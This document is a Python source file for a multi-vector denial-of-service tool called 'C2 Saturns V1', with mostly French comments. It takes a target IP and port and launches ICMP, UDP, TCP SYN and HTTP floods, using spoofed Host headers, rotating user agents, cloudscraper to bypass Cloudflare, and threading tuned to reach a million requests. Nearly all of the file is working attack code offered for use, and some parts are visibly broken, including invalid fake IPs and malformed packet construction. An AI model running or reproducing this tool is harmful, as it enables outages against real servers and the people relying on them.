import socket, threading, random, os, colorama, cloudscraper, requests, struct, time, whois, asyncio, aiohttp, concurrent.futures
from sqlite3 import Time
from scapy.all import *
from colorama import Fore
import multiprocessing
from queue import Queue
import json

fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
global ua
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')

logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              C2 Saturns
                   V1
              MADE BY : BL3Z/PS7 hit again
"""
print(Fore.LIGHTMAGENTA_EX + logo)
try:
    ip = input(f"\033[1;37mIP Target : ")
    port = int(input("Port : "))
    bytes = int(input("Bytes Per Sec : "))
    thrs = int(input("Thread : "))
    bost = input("Use Boost ? Y/N : ")
    attack_type = input("Attack Type (L3/L4/L7) : ").upper()
    if attack_type not in ['L3', 'L4', 'L7']:
        attack_type = 'L7'  # Par défaut L7
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')
    if bost == 'y':
        bytes = bytes + 2000  # Boost augmenté de 500 à 2000
    else:
        bytes = bytes + 1000  # Boost par défaut même sans option 
    print(Fore.LIGHTMAGENTA_EX + logo)
    print(Fore.LIGHTRED_EX+"Attacking...")
    print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ BPS   : {bytes}")
    print(f"║ Thrds : {thrs} ")
    print(f"║ Boost : {bost} ")
    print(f"║ Type  : {attack_type} ")
    print(f"║ Bot   : {bytes} ")
    print("╚═════════════════")
    # Pool de connexions optimisé pour 1M de requêtes
    socket_pool = []
    for _ in range(200):  # Pool étendu à 200 sockets
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.01)  # Timeout très court
            socket_pool.append(sock)
        except:
            pass
    
    # Compteurs pour monitoring
    request_count = 0
    start_time = time.time()
    
    # Classe pour monitoring des performances
    class PerformanceMonitor:
        def __init__(self):
            self.requests_sent = 0
            self.start_time = time.time()
            self.last_update = time.time()
        
        def update(self, count):
            self.requests_sent += count
            current_time = time.time()
            if current_time - self.last_update >= 1:  # Mise à jour chaque seconde
                rps = self.requests_sent / (current_time - self.start_time)
                print(f"\r[STATS] Requêtes: {self.requests_sent} | RPS: {rps:.0f}", end="", flush=True)
                self.last_update = current_time
    
    monitor = PerformanceMonitor()
    
    # Fonction d'attaque L7 optimisée pour 1M de requêtes
    async def l7_attack_async(session, target_ip, target_port, fake_ip):
        """Attaque L7 asynchrone optimisée"""
        try:
            # Requêtes HTTP/HTTPS multiples
            tasks = []
            for _ in range(100):  # 100 requêtes par batch
                task = session.get(
                    f"http://{target_ip}:{target_port}/",
                    headers={
                        'User-Agent': random.choice(ua),
                        'Host': fake_ip,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    },
                    timeout=aiohttp.ClientTimeout(total=1)
                )
                tasks.append(task)
            
            # Exécution parallèle de toutes les requêtes
            await asyncio.gather(*tasks, return_exceptions=True)
            monitor.update(100)
            
        except Exception:
            pass
    
    def l7_attack_sync(target_ip, target_port, fake_ip):
        """Attaque L7 synchrone optimisée"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(ua),
                'Host': fake_ip,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            })
            
            # Envoi de requêtes en batch
            for _ in range(50):  # 50 requêtes par batch
                try:
                    response = session.get(
                        f"http://{target_ip}:{target_port}/",
                        timeout=1,
                        stream=True
                    )
                    monitor.update(1)
                except:
                    pass
                    
        except Exception:
            pass
    
    def l4_attack_optimized(target_ip, target_port):
        """Attaque L4 optimisée"""
        try:
            # Pool de sockets pour TCP
            tcp_sockets = []
            for _ in range(20):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                tcp_sockets.append(sock)
            
            # Attaque TCP SYN Flood
            for sock in tcp_sockets:
                try:
                    sock.connect_ex((target_ip, target_port))
                    sock.close()
                    monitor.update(1)
                except:
                    pass
                    
            # Attaque UDP Flood
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(100):
                try:
                    data = random._urandom(1024)
                    udp_sock.sendto(data, (target_ip, target_port))
                    monitor.update(1)
                except:
                    pass
                    
        except Exception:
            pass
    
    def l3_attack_optimized(target_ip):
        """Attaque L3 optimisée"""
        try:
            # Attaque ICMP
            icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(50):
                try:
                    packet = b'\x08\x00\x00\x00' + random._urandom(1024)
                    icmp_sock.sendto(packet, (target_ip, 0))
                    monitor.update(1)
                except:
                    pass
        except Exception:
            pass
    
    def c2():
        if attack_type == 'L7':
            # Attaque L7 optimisée pour 1M de requêtes
            for fk in fake:
                try:
                    # Attaque L7 synchrone
                    l7_attack_sync(ip, port, fk)
                    
                    # Attaque L7 asynchrone (si possible)
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        session = aiohttp.ClientSession()
                        loop.run_until_complete(l7_attack_async(session, ip, port, fk))
                        session.close()
                    except:
                        pass
                        
                except Exception:
                    pass
                    
        elif attack_type == 'L4':
            # Attaque L4 optimisée
            l4_attack_optimized(ip, port)
            
        elif attack_type == 'L3':
            # Attaque L3 optimisée
            l3_attack_optimized(ip)
            
        else:
            # Code original pour compatibilité
            for fk in fake:
                try:
                    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
                    byte = random._urandom(65507)  # Taille maximale UDP
                    sent = 5000
                    s1.sendto(byte, (ip,port))
                    # Optimisation des boucles - envoi multiple par itération
                    for i in range(bytes // 10):  # Réduction du nombre d'itérations
                        for _ in range(10):  # Envoi multiple par itération
                            s1.sendto(byte, (ip,port))
                            s1.sendto(byte, (ip,port))
                    
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #HTTP
                    s2.connect((ip,port))
                    s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"))
                    s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"))
                    s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode("utf-8"))
                    s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"))
                    s2.send(byte)
                    
                    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TLS
                    s3.connect((ip,port))
                    s3.send((byte))
                    
                    # Utilisation de scapy pour TCP
                    from scapy.all import IP, TCP, Raw, send, RandShort
                    ip_packet = IP(dst=ip) #TCP
                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
                    raw = Raw(b"X"*65507)  # Taille maximale pour TCP
                    p = ip_packet / tcp / raw
                    send(p, loop=bytes, verbose=0)
                    
                    scraper = cloudscraper.create_scraper()
                    scraper.get(ip, timeout=thrs)
                    
                    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    byte = random._urandom(65507)  # Taille maximale UDP
                    
                    udp.sendto(byte, (ip,port))
                    http.connect((ip,port))
                    tls.connect((ip,port))
                    tls.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'))
                    
                    session = requests.session()
                    scraper = cloudscraper.create_scraper(sess=session)
                    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                    
                    # Optimisation des boucles - envoi multiple par itération
                    for i in range(bytes // 5):  # Réduction du nombre d'itérations
                        for _ in range(5):  # Envoi multiple par itération
                            udp.sendto(byte, (ip,port))
                            udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                            http.send(byte)
                            tls.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'))
                        
                        pack = "SYN\x00"
                        pack_len = len(pack)
                        tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                        tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                        tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                        # Add TCP/IP header
                        tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                        tcp.send(tcp_packet)
                        scraper.get(ip, timeout=thrs)
                        scraper = cloudscraper.create_scraper(server_hostname=fk)
                        scraper.get(
                            ip,
                            headers={'Host': fk}
                        )
                except Exception:
                    pass
    # Création de threads optimisés pour 1M de requêtes
    if attack_type == 'L7':
        # Pour L7, utiliser plus de threads et multiprocessing
        max_workers = min(thrs * 4, 200)  # Limite à 200 threads max
        threads = []
        
        # Threads principaux
        for i in range(thrs):
            thread = threading.Thread(target=c2, daemon=True)
            thread.start()
            threads.append(thread)
        
        # Threads supplémentaires pour L7
        for i in range(thrs * 2):
            thread = threading.Thread(target=c2, daemon=True)
            thread.start()
            threads.append(thread)
            
    else:
        # Pour L3/L4, utiliser le nombre de threads normal
        threads = []
        for i in range(thrs):
            thread = threading.Thread(target=c2, daemon=True)
            thread.start()
            threads.append(thread)
    
    # Monitoring en arrière-plan
    def monitor_thread():
        while True:
            time.sleep(1)
            if monitor.requests_sent >= 1000000:  # Arrêt à 1M de requêtes
                print(f"\n[INFO] Objectif de 1M de requêtes atteint !")
                break
    
    monitor_thread_obj = threading.Thread(target=monitor_thread, daemon=True)
    monitor_thread_obj.start()
    
    # Attendre que tous les threads se terminent
    for thread in threads:
        thread.join()
except ValueError:
    print("\033[1;33mDid you fill the target info correctly? please retry!")
